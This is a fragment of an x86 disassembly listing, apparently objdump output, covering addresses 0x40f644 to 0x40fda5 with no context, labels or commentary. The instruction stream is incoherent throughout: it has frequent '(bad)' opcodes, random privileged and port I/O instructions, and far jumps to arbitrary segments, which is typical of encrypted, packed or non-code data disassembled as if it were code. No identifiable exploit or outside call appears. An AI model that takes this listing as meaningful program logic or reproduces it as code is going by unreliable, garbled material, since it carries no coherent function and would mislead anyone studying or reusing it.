  40f644:	jg     0x40f6ad
  40f646:	fild   WORD PTR [eax+0x1f748d31]
  40f64c:	cmp    ah,BYTE PTR [esi+0x54732c51]
  40f652:	(bad)  
  40f653:	ds cdq 
  40f655:	and    al,0x29
  40f657:	les    eax,FWORD PTR [ebx+0x9f60e89]
  40f65d:	mov    dh,0xd8
  40f65f:	hlt    
  40f660:	mov    cl,0xb3
  40f662:	rol    DWORD PTR fs:[esi-0x55bdfa78],0xae
  40f66a:	repz pusha 
  40f66c:	jb     0x40f600
  40f66e:	rcl    DWORD PTR [ebx],0xfc
  40f671:	xchg   ecx,eax
  40f672:	jmp    0x7df4:0x56e187a3
  40f679:	xor    ebp,DWORD PTR gs:0x9bd6255d
  40f680:	and    dl,ah
  40f682:	ins    DWORD PTR es:[edi],dx
  40f683:	pop    esi
  40f684:	mov    ch,0x1c
  40f686:	jns    0x40f6e1
  40f688:	rcl    BYTE PTR [edi+0x6a98bb6],cl
  40f68e:	push   ecx
  40f68f:	cli    
  40f690:	scas   al,BYTE PTR es:[edi]
  40f691:	(bad)  
  40f692:	in     eax,0x62
  40f694:	or     esi,DWORD PTR [ebx]
  40f696:	dec    esp
  40f697:	sbb    al,bh
  40f699:	or     BYTE PTR [ecx-0x29],dh
  40f69c:	push   esp
  40f69d:	inc    eax
  40f69e:	and    BYTE PTR [edx+edi*4],al
  40f6a1:	int    0x6c
  40f6a3:	push   ecx
  40f6a4:	mov    ch,0x1f
  40f6a6:	imul   ebp,DWORD PTR [edi+ebx*8],0xbca6eda7
  40f6ad:	cmp    esi,DWORD PTR [ecx]
  40f6af:	jp     0x40f6f6
  40f6b1:	mov    eax,0x804027be
  40f6b6:	inc    ecx
  40f6b7:	push   0xffffffe3
  40f6b9:	pop    eax
  40f6ba:	cmp    eax,0x5589c3c3
  40f6bf:	icebp  
  40f6c0:	shl    esp,0x67
  40f6c3:	push   edx
  40f6c4:	es pop edi
  40f6c6:	mov    edi,0xaf12d4a1
  40f6cb:	into   
  40f6cc:	rcl    BYTE PTR [esi],0x5
  40f6cf:	mov    ecx,DWORD PTR ds:[ecx]
  40f6d2:	lods   al,BYTE PTR ds:[esi]
  40f6d3:	popa   
  40f6d4:	mov    al,ds:0x549c11f4
  40f6d9:	ds inc eax
  40f6db:	ins    BYTE PTR es:[edi],dx
  40f6dc:	dec    edi
  40f6dd:	rcr    DWORD PTR [edx],0x63
  40f6e0:	sbb    al,0x89
  40f6e2:	pop    edi
  40f6e3:	push   ecx
  40f6e4:	mov    eax,0xa67863cb
  40f6e9:	pop    edi
  40f6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6eb:	data16 jg 0x40f6ab
  40f6ee:	ds inc esp
  40f6f0:	xchg   esi,ecx
  40f6f2:	pop    ds
  40f6f3:	push   eax
  40f6f4:	imul   esi,DWORD PTR [ebp-0x7684607b],0x854aabe7
  40f6fe:	or     esi,DWORD PTR [ecx-0x70]
  40f701:	sub    eax,0x591f5065
  40f706:	fidiv  DWORD PTR [ebp-0x40]
  40f709:	inc    ebp
  40f70a:	imul   edx,ebx,0xc5321d70
  40f710:	call   0x9e942348
  40f715:	pop    ebx
  40f716:	ret    0x35f
  40f719:	sub    al,0x5b
  40f71c:	pop    ebx
  40f71d:	jl     0x40f74e
  40f71f:	dec    edi
  40f720:	push   ecx
  40f721:	or     eax,0xef5b17c8
  40f726:	push   esi
  40f727:	lock ficomp WORD PTR [ebp-0x5a]
  40f72b:	push   esp
  40f72c:	pop    eax
  40f72d:	bnd jnp 0x40f787
  40f730:	(bad)  [esi+0x6fa33bef]
  40f736:	rcl    BYTE PTR [esi+0x5b5fa7e2],cl
  40f73c:	push   0xffffffc5
  40f73e:	dec    esi
  40f73f:	sbb    esp,DWORD PTR [edi-0x28]
  40f742:	nop
  40f743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f744:	lea    eax,[eax-0x34]
  40f747:	in     al,dx
  40f748:	jg     0x40f748
  40f74a:	mov    dl,0xe3
  40f74c:	mov    al,0x50
  40f74e:	cmp    ecx,0xe7bd4bcc
  40f754:	jb     0x40f6fa
  40f756:	sub    eax,0xf8ce65ba
  40f75b:	sahf   
  40f75c:	inc    esp
  40f75d:	xor    al,BYTE PTR [esi]
  40f75f:	cs iret 
  40f761:	inc    edi
  40f762:	add    eax,0xeb649a5f
  40f767:	rol    DWORD PTR [ebp+0x6995f8b6],cl
  40f76d:	sar    BYTE PTR [ecx+ebx*1+0x64],cl
  40f771:	push   edi
  40f772:	cdq    
  40f773:	pushf  
  40f774:	pop    esp
  40f775:	push   es
  40f776:	push   es
  40f777:	hlt    
  40f778:	xchg   ebx,eax
  40f779:	xchg   esi,eax
  40f77a:	or     eax,0x884eea05
  40f77f:	cmc    
  40f780:	sub    eax,0x6c8fcbde
  40f785:	enter  0xf187,0x3f
  40f789:	add    eax,0xe001a6aa
  40f78e:	cmp    BYTE PTR [esi+0x17],cl
  40f791:	mov    ch,0x28
  40f793:	cld    
  40f794:	mov    ds:0x65727234,eax
  40f799:	xchg   edi,eax
  40f79a:	mov    eax,0x3a04593c
  40f79f:	sar    dh,0x89
  40f7a2:	dec    eax
  40f7a3:	jp     0x40f7e2
  40f7a5:	ret    0x806f
  40f7a8:	mov    edx,0xf5569929
  40f7ad:	or     eax,0xd0bf75b9
  40f7b2:	aad    0x86
  40f7b4:	push   esi
  40f7b5:	mov    ebx,0xffc4876a
  40f7ba:	aam    0x73
  40f7bc:	dec    ebx
  40f7bd:	lods   al,BYTE PTR ds:[esi]
  40f7be:	mov    ebx,0x53cb92e7
  40f7c3:	adc    al,0x33
  40f7c5:	adc    DWORD PTR [edx-0x6f],ecx
  40f7c8:	mov    edi,0xea290885
  40f7cd:	test   DWORD PTR [eax-0x742a5f27],0x9fd27e89
  40f7d7:	add    DWORD PTR [ecx+ebp*1],edi
  40f7da:	(bad)  
  40f7dc:	loope  0x40f80f
  40f7de:	adc    DWORD PTR [edi],eax
  40f7e0:	jo     0x40f822
  40f7e2:	fdiv   DWORD PTR [esp+ebx*4+0x1a]
  40f7e6:	lock and eax,0xa8820ba0
  40f7ec:	ret    
  40f7ed:	dec    ebp
  40f7ee:	and    ecx,edi
  40f7f0:	fs push ebx
  40f7f2:	rcl    esi,0xa5
  40f7f5:	in     al,dx
  40f7f6:	sti    
  40f7f7:	jne    0x40f875
  40f7f9:	dec    ecx
  40f7fa:	aas    
  40f7fb:	mov    eax,0x726dd163
  40f800:	xor    DWORD PTR [eax+0x5a0f93bc],ebp
  40f806:	or     al,0x62
  40f808:	das    
  40f809:	jnp    0x40f860
  40f80b:	add    edx,ebx
  40f80d:	es xchg ebx,eax
  40f80f:	inc    ebx
  40f810:	xchg   ecx,eax
  40f811:	ins    BYTE PTR es:[edi],dx
  40f812:	(bad)  
  40f813:	fimul  DWORD PTR [ebp+0x347e7c9]
  40f819:	sbb    ch,BYTE PTR [ebx-0x48]
  40f81c:	std    
  40f81d:	jmp    0x5d0c:0x2bda993e
  40f824:	mov    ch,0xa5
  40f826:	cmp    esp,esp
  40f828:	in     al,dx
  40f829:	xchg   DWORD PTR [ebx-0x7b],edx
  40f82c:	(bad)  
  40f82d:	push   ds
  40f82e:	aam    0x68
  40f830:	aam    0xcd
  40f832:	sub    dl,bl
  40f834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f835:	pop    edx
  40f836:	mov    eax,0xa5ae59b
  40f83b:	daa    
  40f83c:	and    bh,BYTE PTR [ebp-0x458b73e6]
  40f842:	or     BYTE PTR [ecx+0x23],bh
  40f845:	fwait
  40f846:	jl     0x40f8a2
  40f848:	inc    esp
  40f849:	cmp    al,0x2d
  40f84b:	retf   
  40f84c:	pushf  
  40f84d:	and    ebp,eax
  40f84f:	add    ecx,esp
  40f851:	out    0x2d,al
  40f853:	xchg   DWORD PTR [ebx-0x7a],edi
  40f856:	stos   DWORD PTR es:[edi],eax
  40f857:	test   eax,0xca7a0744
  40f85c:	scas   eax,DWORD PTR es:[edi]
  40f85d:	add    al,dh
  40f85f:	fcmove st,st(7)
  40f861:	ins    BYTE PTR es:[edi],dx
  40f862:	int3   
  40f863:	ins    DWORD PTR es:[edi],dx
  40f864:	aaa    
  40f865:	ror    DWORD PTR [edx-0x22f22ee9],cl
  40f86b:	neg    BYTE PTR [ecx+0x1788877a]
  40f871:	fisub  WORD PTR [ebx]
  40f873:	or     cl,ch
  40f875:	shl    edx,1
  40f877:	mov    esi,DWORD PTR [eax]
  40f879:	outs   dx,BYTE PTR ds:[esi]
  40f87a:	sub    edi,DWORD PTR [edx]
  40f87c:	nop
  40f87d:	pop    ecx
  40f87e:	fadd   DWORD PTR [esi+edx*4+0x5adba02b]
  40f885:	fiadd  DWORD PTR [esi-0x51]
  40f888:	and    ecx,DWORD PTR [ecx+ebp*4-0x2f]
  40f88c:	sub    BYTE PTR [ebx+0x56],bh
  40f88f:	imul   ecx,DWORD PTR [esi-0x7a],0xffffff90
  40f893:	fwait
  40f894:	dec    eax
  40f895:	in     eax,0xc0
  40f897:	int    0x5f
  40f899:	mov    ecx,0xdde5e951
  40f89e:	pop    edx
  40f89f:	mov    DWORD PTR [edx-0x52],esp
  40f8a2:	nop
  40f8a3:	retf   
  40f8a4:	retf   0x7d8c
  40f8a7:	pop    edi
  40f8a8:	inc    ebx
  40f8a9:	jmp    0x40f86b
  40f8ab:	hlt    
  40f8ac:	stc    
  40f8ad:	and    eax,DWORD PTR [ebx-0x1a]
  40f8b0:	jno    0x40f903
  40f8b2:	push   edx
  40f8b3:	cdq    
  40f8b4:	test   BYTE PTR [esi-0x14],dl
  40f8b7:	(bad)  
  40f8b8:	mov    DWORD PTR [eax+0x9c94a51],edi
  40f8be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8bf:	add    esp,DWORD PTR [ebp+ecx*1-0x22]
  40f8c3:	outs   dx,DWORD PTR ds:[esi]
  40f8c4:	mov    bh,0x4d
  40f8c6:	nop
  40f8c7:	push   edi
  40f8c8:	js     0x40f945
  40f8ca:	jmp    FWORD PTR [ecx+0x3a]
  40f8cd:	push   edi
  40f8ce:	push   cs
  40f8cf:	(bad)  
  40f8d0:	sahf   
  40f8d1:	jp     0x40f92d
  40f8d3:	xchg   DWORD PTR [eax+0x14a5b4b0],eax
  40f8d9:	xlat   BYTE PTR ds:[ebx]
  40f8da:	ja     0x40f8e9
  40f8dc:	dec    eax
  40f8dd:	idiv   dl
  40f8df:	cli    
  40f8e0:	stos   DWORD PTR es:[edi],eax
  40f8e1:	xor    eax,0xf892f0f1
  40f8e6:	add    ecx,DWORD PTR [ebp+0x78]
  40f8e9:	mov    ch,0x69
  40f8eb:	nop
  40f8ec:	fsub   QWORD PTR [ebx]
  40f8ee:	add    DWORD PTR [edx],ecx
  40f8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8f1:	nop
  40f8f2:	pop    esp
  40f8f3:	stos   BYTE PTR es:[edi],al
  40f8f4:	jecxz  0x40f8e6
  40f8f6:	jno    0x40f8b5
  40f8f8:	push   esi
  40f8f9:	and    eax,0xa3c97247
  40f8fe:	add    eax,0xbde595f9
  40f903:	stc    
  40f904:	push   esi
  40f905:	sbb    DWORD PTR [eax+ebp*1],0xe54019f2
  40f90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f90d:	or     ah,BYTE PTR [ebx]
  40f90f:	leave  
  40f910:	shr    BYTE PTR [edx-0x761ae832],cl
  40f916:	fisttp DWORD PTR [ecx]
  40f918:	mov    eax,ds:0xdf73696a
  40f91d:	jp     0x40f8e7
  40f91f:	pop    eax
  40f920:	jmp    0x40f8a6
  40f922:	mov    ecx,0x20d20813
  40f927:	dec    ecx
  40f928:	aas    
  40f929:	adc    ebx,ecx
  40f92b:	cmp    DWORD PTR [ecx-0x69],edx
  40f92e:	daa    
  40f92f:	arpl   WORD PTR ds:0x8419d6a4,dx
  40f935:	pop    edx
  40f936:	push   ebp
  40f937:	(bad)  
  40f938:	pop    edx
  40f939:	scas   al,BYTE PTR es:[di]
  40f93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f93c:	(bad)  
  40f93d:	lods   al,BYTE PTR ds:[esi]
  40f93e:	emms   
  40f940:	push   esp
  40f941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f942:	pop    esi
  40f943:	fcomp  DWORD PTR [ebx+0x3]
  40f946:	cmp    ch,BYTE PTR [edx+0x66139143]
  40f94c:	rcr    esp,cl
  40f94e:	pop    esp
  40f94f:	jns    0x40f8db
  40f951:	jmp    0x40f907
  40f953:	mov    edx,0xf228c431
  40f958:	adc    esi,edi
  40f95a:	fdivr  QWORD PTR ds:0x2f10e5a7
  40f960:	cmp    bh,BYTE PTR ds:0xed863270
  40f966:	mov    fs,WORD PTR [ecx+0x5b94cae3]
  40f96c:	push   ebx
  40f96d:	les    ebx,FWORD PTR [ebx]
  40f96f:	xchg   ebp,eax
  40f970:	(bad)  
  40f971:	xchg   edx,eax
  40f972:	adc    ch,BYTE PTR [eax]
  40f974:	add    ebx,ebx
  40f976:	loopne 0x40f9f5
  40f978:	popf   
  40f979:	cmp    BYTE PTR [esp+eiz*8+0x3acc3ac8],bh
  40f980:	xor    eax,0x336e6cf4
  40f985:	xor    DWORD PTR [edx+0x1c],esi
  40f988:	pushf  
  40f989:	cmp    eax,0xc2362be2
  40f98e:	dec    esi
  40f98f:	mov    ds:0x84fa5503,eax
  40f994:	push   DWORD PTR [ecx-0x5a]
  40f997:	xchg   esi,eax
  40f998:	mov    esi,0x23a90e83
  40f99d:	test   DWORD PTR [ebp-0x101585a3],0x9f395c5f
  40f9a7:	xor    bl,bl
  40f9a9:	sbb    al,0xec
  40f9ab:	ficom  WORD PTR [esi+0x1b]
  40f9ae:	or     esi,DWORD PTR [edi]
  40f9b0:	test   al,0x51
  40f9b2:	cmp    al,0xce
  40f9b4:	jg     0x40f9fb
  40f9b6:	mov    esp,esp
  40f9b8:	ficomp DWORD PTR [esi]
  40f9ba:	test   DWORD PTR [ebp+0x4b],0x7751bb1a
  40f9c1:	idiv   BYTE PTR ds:0x5bf7e6c4
  40f9c7:	icebp  
  40f9c8:	imul   esi,DWORD PTR [esi+0x681d63f0],0x50
  40f9cf:	xor    al,0x76
  40f9d1:	in     al,dx
  40f9d2:	mov    dh,0xbc
  40f9d4:	imul   edx,edi,0x6a
  40f9d7:	(bad)  
  40f9d8:	fiadd  DWORD PTR [ecx+0x42]
  40f9db:	pop    eax
  40f9dc:	cld    
  40f9dd:	mov    al,ds:0x1333534a
  40f9e2:	nop
  40f9e3:	push   edx
  40f9e4:	test   BYTE PTR [eax],0xf9
  40f9e7:	jle    0x40f9d4
  40f9e9:	jle    0x40f9d1
  40f9eb:	mov    ebx,0xe1fb4fec
  40f9f0:	jne    0x40f9db
  40f9f2:	stos   BYTE PTR es:[edi],al
  40f9f3:	or     DWORD PTR [edi-0x99cf055],0xffffff86
  40f9fa:	mov    al,0xe8
  40f9fc:	inc    esp
  40f9fd:	ficomp WORD PTR [eax]
  40f9ff:	mov    al,ds:0x35d4277f
  40fa04:	cmp    eax,0x57f64035
  40fa09:	inc    esp
  40fa0a:	fcomi  st,st(1)
  40fa0c:	dec    edi
  40fa0d:	or     al,0x62
  40fa0f:	mov    al,ds:0xf27bf1d2
  40fa14:	imul   esp,DWORD PTR [ecx-0x46],0x1f
  40fa18:	push   0x59
  40fa1a:	jmp    0x40f9a5
  40fa1c:	cld    
  40fa1d:	adc    ch,0xaa
  40fa20:	fiadd  WORD PTR [eax*2-0xf8594ae]
  40fa27:	or     dh,BYTE PTR [esi+0xa5c21fd]
  40fa2d:	and    BYTE PTR [esp+edi*8],ch
  40fa30:	or     eax,0xfac35196
  40fa35:	mov    ecx,0x87d3c69d
  40fa3a:	xor    DWORD PTR [ebp+0x675ec2fb],ebp
  40fa40:	cmp    eax,0xd78ebed2
  40fa45:	inc    eax
  40fa46:	lahf   
  40fa47:	dec    eax
  40fa48:	pop    ebx
  40fa49:	out    dx,al
  40fa4a:	fisub  DWORD PTR [edi]
  40fa4c:	cld    
  40fa4d:	lods   al,BYTE PTR ds:[esi]
  40fa4e:	jb     0x40fa98
  40fa50:	icebp  
  40fa51:	add    ebx,ebx
  40fa53:	mov    cs,WORD PTR [edi]
  40fa55:	outs   dx,BYTE PTR ds:[esi]
  40fa56:	rcl    BYTE PTR ds:0x69eb128a,0xa8
  40fa5d:	jns    0x40f9ec
  40fa5f:	or     bh,al
  40fa61:	sub    BYTE PTR ds:0xfb0f0d86,bl
  40fa67:	cli    
  40fa68:	jecxz  0x40fa4c
  40fa6a:	fsub   st(3),st
  40fa6c:	sub    eax,0xce6ced3b
  40fa71:	into   
  40fa72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa73:	popa   
  40fa74:	cdq    
  40fa75:	ss inc ecx
  40fa77:	dec    edi
  40fa78:	mov    WORD PTR [ebx],cs
  40fa7a:	mov    eax,ds:0x7caa339c
  40fa7f:	add    eax,0x275d04c5
  40fa84:	mov    ebx,0xe1e92c6d
  40fa89:	or     eax,0x5f861842
  40fa8e:	call   DWORD PTR [edx]
  40fa90:	push   eax
  40fa91:	iret   
  40fa92:	fistp  DWORD PTR [esi-0x7b8ed578]
  40fa98:	mov    ecx,0xe4c60996
  40fa9d:	mov    ebp,0xe02e1e61
  40faa2:	shr    DWORD PTR [ebp-0x2e],cl
  40faa5:	imul   ecx,DWORD PTR [ecx],0x6a124eb0
  40faab:	add    eax,0xe271f459
  40fab0:	sub    esi,DWORD PTR [ebx-0x21f38339]
  40fab6:	je     0x40fa88
  40fab8:	add    eax,0x6eec9d26
  40fabd:	nop
  40fabe:	inc    dh
  40fac0:	rcl    ecx,0xaa
  40fac3:	int    0x27
  40fac5:	mov    WORD PTR [ebp+0x55],ds
  40fac8:	add    bl,BYTE PTR [eax+edx*4]
  40facb:	not    BYTE PTR [edx+0x72]
  40face:	out    0xad,eax
  40fad0:	xor    edi,DWORD PTR [eax-0x49]
  40fad3:	sbb    al,0xc9
  40fad5:	lahf   
  40fad6:	fnstsw WORD PTR [ebx+0x568f7ca3]
  40fadc:	and    BYTE PTR [ebp+0x743ab77f],bh
  40fae2:	adc    DWORD PTR [edx+ebx*2-0xe],0xf12ff2ac
  40faea:	gs inc ebp
  40faec:	mov    ds:0xfc6b5aa6,al
  40faf1:	mov    eax,0x238f4323
  40faf6:	out    dx,eax
  40faf7:	das    
  40faf8:	push   0xffffff9d
  40fafa:	ret    
  40fafb:	and    DWORD PTR [ebx],ebx
  40fafd:	cmp    BYTE PTR [edi-0x4adb6e14],0x4a
  40fb04:	adc    ebx,eax
  40fb06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb07:	add    DWORD PTR [ebp-0x22],eax
  40fb0a:	sub    eax,0xa9a90dc3
  40fb0f:	shr    dh,cl
  40fb11:	sub    ch,0xd7
  40fb14:	test   eax,0x3185a172
  40fb19:	pop    ds
  40fb1a:	and    esi,0x26
  40fb1d:	data16 stc 
  40fb1f:	js     0x40fb2c
  40fb21:	dec    esi
  40fb22:	and    edi,edx
  40fb24:	stos   DWORD PTR es:[edi],eax
  40fb25:	pop    ss
  40fb26:	mov    ecx,0xd54145b
  40fb2b:	inc    edx
  40fb2c:	jmp    0x5482f19
  40fb31:	(bad)  
  40fb32:	mov    BYTE PTR [edx+0x7],dh
  40fb35:	repz mov ecx,0x92c343a8
  40fb3b:	xor    ebx,DWORD PTR [ecx-0x7f]
  40fb3e:	sub    BYTE PTR [ebx-0x40],0x32
  40fb42:	mov    eax,0xe5ef022b
  40fb47:	fnstenv [esi]
  40fb49:	mov    WORD PTR [edx],ds
  40fb4b:	dec    ebp
  40fb4c:	inc    edx
  40fb4d:	imul   edi,DWORD PTR [edi-0x7f],0x75
  40fb51:	in     al,dx
  40fb52:	xor    DWORD PTR [eax],edi
  40fb54:	cmp    al,0x3d
  40fb56:	out    dx,al
  40fb57:	mov    ebx,0xcf251fc6
  40fb5c:	enter  0xf78e,0xdc
  40fb60:	scas   al,BYTE PTR es:[edi]
  40fb61:	scas   eax,DWORD PTR es:[edi]
  40fb62:	push   ss
  40fb63:	test   eax,0x57f301fe
  40fb68:	les    esi,FWORD PTR [ebx]
  40fb6a:	add    BYTE PTR [eax],ah
  40fb6c:	ds gs dec ebx
  40fb6f:	repz inc ebx
  40fb71:	outs   dx,BYTE PTR ds:[esi]
  40fb72:	fs adc al,0x46
  40fb75:	sbb    ah,BYTE PTR [ecx]
  40fb77:	mov    ?,WORD PTR [edi+0x1f]
  40fb7a:	adc    dl,BYTE PTR [edi+0x24ed8f70]
  40fb80:	push   cs
  40fb81:	mov    edi,0xf38f3df5
  40fb86:	cmp    esp,DWORD PTR [bp+si+0x25e3]
  40fb8b:	in     eax,dx
  40fb8c:	cwde   
  40fb8d:	int3   
  40fb8e:	inc    esi
  40fb8f:	and    DWORD PTR [edx-0x5c286d9f],edx
  40fb95:	push   0x58393a5b
  40fb9a:	or     BYTE PTR [edx-0x66],dh
  40fb9d:	int3   
  40fb9e:	or     ebp,ebp
  40fba0:	inc    ebx
  40fba1:	push   edx
  40fba2:	shr    bl,cl
  40fba4:	(bad)  
  40fba5:	hlt    
  40fba6:	pusha  
  40fba7:	pop    ecx
  40fba8:	jae    0x40fba0
  40fbaa:	div    BYTE PTR [edx-0x2b418fe5]
  40fbb0:	mov    ah,0xf4
  40fbb2:	les    ebx,FWORD PTR ds:0x97f726ea
  40fbb8:	mov    ch,0xa6
  40fbba:	retf   0x5ceb
  40fbbd:	push   esp
  40fbbe:	add    cl,BYTE PTR [edx+eax*2]
  40fbc1:	shl    ebx,1
  40fbc3:	test   eax,0x80d164a1
  40fbc8:	pop    edi
  40fbc9:	pop    ss
  40fbca:	out    0x12,eax
  40fbcc:	cmp    DWORD PTR [eiz*4-0x67fec897],ecx
  40fbd3:	push   ebx
  40fbd4:	fcom   QWORD PTR [ebx+0x38fb1726]
  40fbda:	xchg   DWORD PTR [ebx-0x6a833a3a],eax
  40fbe0:	ja     0x40fc4d
  40fbe2:	lods   al,BYTE PTR ds:[esi]
  40fbe3:	sbb    ecx,DWORD PTR [edx]
  40fbe5:	add    ebp,eax
  40fbe7:	mov    ebx,0xa4307d85
  40fbec:	mov    DWORD PTR [ebx+0x3b],ebx
  40fbef:	shl    BYTE PTR [ebx-0x388e87c5],1
  40fbf5:	add    BYTE PTR [edi+0x68],dh
  40fbf8:	xor    al,0x81
  40fbfa:	adc    esi,DWORD PTR fs:[ebp+0xf]
  40fbfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbff:	xchg   bl,dl
  40fc01:	mov    bh,0x6e
  40fc03:	mov    edi,eax
  40fc05:	xor    al,0x97
  40fc07:	inc    ecx
  40fc08:	push   esp
  40fc09:	mov    edi,0x90a1e275
  40fc0e:	jmp    0x7ba3:0x1e0b9f99
  40fc15:	aam    0x3e
  40fc17:	inc    esi
  40fc18:	(bad)  
  40fc19:	or     BYTE PTR [ebx],dl
  40fc1b:	mov    ?,WORD PTR [edi+0x982e3db]
  40fc21:	adc    eax,0x60e5609f
  40fc26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc27:	fidivr DWORD PTR [ecx-0xc]
  40fc2a:	fisubr WORD PTR [ebx+eiz*2-0x39ca6d8a]
  40fc31:	jp     0x40fc81
  40fc33:	imul   esi,eax,0xedd832a9
  40fc39:	cli    
  40fc3a:	cmp    al,0xa9
  40fc3c:	out    0xf7,eax
  40fc3e:	mov    ds:0xa668a645,eax
  40fc43:	mov    esi,0x6b86337a
  40fc48:	shl    BYTE PTR [edx+0x2a],cl
  40fc4b:	jne    0x40fc02
  40fc4d:	stos   BYTE PTR es:[edi],al
  40fc4e:	xor    al,0x59
  40fc50:	lods   eax,DWORD PTR ds:[esi]
  40fc51:	repnz xchg edi,eax
  40fc53:	mov    edx,0xeda15276
  40fc58:	mov    ds,WORD PTR [eax]
  40fc5a:	out    0x2c,al
  40fc5c:	int    0x39
  40fc5e:	in     eax,0xd0
  40fc60:	stc    
  40fc61:	pop    esi
  40fc62:	hlt    
  40fc63:	mov    edi,0xa00e55b4
  40fc68:	cli    
  40fc69:	sbb    ecx,DWORD PTR [ecx+0x5e1d81f8]
  40fc6f:	mov    ch,0x20
  40fc71:	stc    
  40fc72:	or     BYTE PTR [edi+0x3642154e],ch
  40fc78:	and    bh,ah
  40fc7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc7b:	fidivr DWORD PTR [edx]
  40fc7d:	push   cs
  40fc7e:	xchg   esp,eax
  40fc7f:	push   esp
  40fc80:	mov    ds:0xf89229d9,al
  40fc85:	fs jecxz 0x40fc3f
  40fc88:	addr16 loope 0x40fcfa
  40fc8b:	js     0x40fce9
  40fc8d:	(bad)  
  40fc8e:	dec    edi
  40fc8f:	mov    cl,0xd6
  40fc91:	cmp    ecx,0x23
  40fc94:	sahf   
  40fc95:	push   es
  40fc96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc97:	pop    es
  40fc98:	xor    ebp,DWORD PTR [edi+0x4fdebf84]
  40fc9e:	imul   BYTE PTR [edx]
  40fca0:	dec    ebx
  40fca1:	out    0xc1,eax
  40fca3:	fisttp DWORD PTR [ebx+0x32]
  40fca6:	rcl    edx,0x61
  40fca9:	jae    0x40fd1c
  40fcab:	out    dx,al
  40fcac:	imul   ebx,DWORD PTR [eax],0x3c
  40fcaf:	push   ss
  40fcb0:	into   
  40fcb1:	sti    
  40fcb2:	dec    edi
  40fcb3:	or     DWORD PTR [esi],esp
  40fcb5:	adc    DWORD PTR [ecx+0x7abf1233],esi
  40fcbb:	into   
  40fcbc:	js     0x40fd1e
  40fcbe:	push   ebp
  40fcbf:	xchg   BYTE PTR [eax-0x31],bh
  40fcc2:	mov    ebx,DWORD PTR [ebp+0x50]
  40fcc5:	xchg   edi,eax
  40fcc6:	std    
  40fcc7:	xor    edi,DWORD PTR ds:0x2ea1e5a8
  40fccd:	or     eax,0x13790972
  40fcd2:	inc    ebx
  40fcd3:	scas   al,BYTE PTR es:[edi]
  40fcd4:	mov    ecx,0xb2e6d154
  40fcd9:	js     0x40fc6f
  40fcdb:	out    0x74,eax
  40fcdd:	pop    es
  40fcde:	stos   BYTE PTR es:[edi],al
  40fcdf:	and    DWORD PTR [edx+ebp*1],edx
  40fce2:	jnp    0x40fcb3
  40fce4:	dec    BYTE PTR [esi]
  40fce6:	neg    DWORD PTR [ebx-0x1b]
  40fce9:	jae    0x40fcf6
  40fceb:	nop
  40fcec:	push   esp
  40fced:	mov    bh,0x78
  40fcef:	shl    BYTE PTR [esi-0x29],1
  40fcf2:	call   DWORD PTR [ebx]
  40fcf4:	jecxz  0x40fd6a
  40fcf6:	int    0x5d
  40fcf8:	sar    BYTE PTR [esi-0x1aad6b5a],1
  40fcfe:	jg     0x40fd5e
  40fd00:	mov    ds:0x409a34b8,eax
  40fd05:	lds    esi,FWORD PTR [edi]
  40fd07:	sbb    ch,BYTE PTR [esi]
  40fd09:	out    0xfb,eax
  40fd0b:	add    BYTE PTR [eax+eax*2],dh
  40fd0e:	and    ah,cl
  40fd10:	pop    ss
  40fd11:	fstp   TBYTE PTR [ebx-0x3b8ff47a]
  40fd17:	push   esi
  40fd18:	iret   
  40fd19:	int    0x74
  40fd1b:	sbb    al,0xbe
  40fd1d:	or     eax,0x6d068ce2
  40fd22:	push   0x45
  40fd24:	out    0xfb,al
  40fd26:	inc    edx
  40fd27:	push   0x4edb1ac1
  40fd2c:	dec    esp
  40fd2d:	jp     0x40fd70
  40fd2f:	xor    ebp,DWORD PTR [edi+ecx*8+0x6e]
  40fd33:	out    dx,eax
  40fd34:	ja     0x40fcde
  40fd36:	leave  
  40fd37:	mov    edi,0x8efbe55b
  40fd3c:	out    dx,al
  40fd3d:	ds in  al,dx
  40fd3f:	push   ds
  40fd40:	mov    eax,ds:0xd60c9904
  40fd45:	push   eax
  40fd46:	push   ss
  40fd47:	and    eax,0xf5090d1e
  40fd4c:	out    0x61,eax
  40fd4e:	shl    BYTE PTR ds:[eax+ecx*1-0x105a0ae0],cl
  40fd56:	in     eax,dx
  40fd57:	pop    ss
  40fd58:	(bad)  [eax]
  40fd5a:	lods   al,BYTE PTR ds:[esi]
  40fd5b:	jno    0x40fd76
  40fd5d:	repnz sub ebp,ecx
  40fd60:	push   ebp
  40fd61:	xchg   esi,eax
  40fd62:	je     0x40fd32
  40fd64:	cmc    
  40fd65:	ret    0x5579
  40fd68:	add    al,0xce
  40fd6a:	cwde   
  40fd6b:	cli    
  40fd6c:	dec    edi
  40fd6d:	jecxz  0x40fd3e
  40fd6f:	jne    0x40fd53
  40fd71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd72:	clc    
  40fd73:	cmp    ebp,DWORD PTR [esi]
  40fd75:	loopne 0x40fd39
  40fd77:	add    DWORD PTR [ebp+edi*2+0x13898034],ebx
  40fd7e:	sbb    BYTE PTR [eax],al
  40fd80:	icebp  
  40fd81:	(bad)  
  40fd82:	sti    
  40fd83:	mov    ch,BYTE PTR [eax+esi*8-0x13]
  40fd87:	jbe    0x40fdcd
  40fd89:	xor    cl,BYTE PTR [ebx]
  40fd8b:	arpl   WORD PTR [ebp+0x778c0004],di
  40fd91:	mov    ebx,0xd3f84d36
  40fd96:	pop    esp
  40fd97:	stc    
  40fd98:	fsub   QWORD PTR [esi-0x4b412ced]
  40fd9e:	jg     0x40fded
  40fda0:	std    
  40fda1:	sar    DWORD PTR [edx],cl
  40fda3:	xor    al,0x96
  40fda5:	ficomp DWORD PTR [ebx-0x511e1ad]
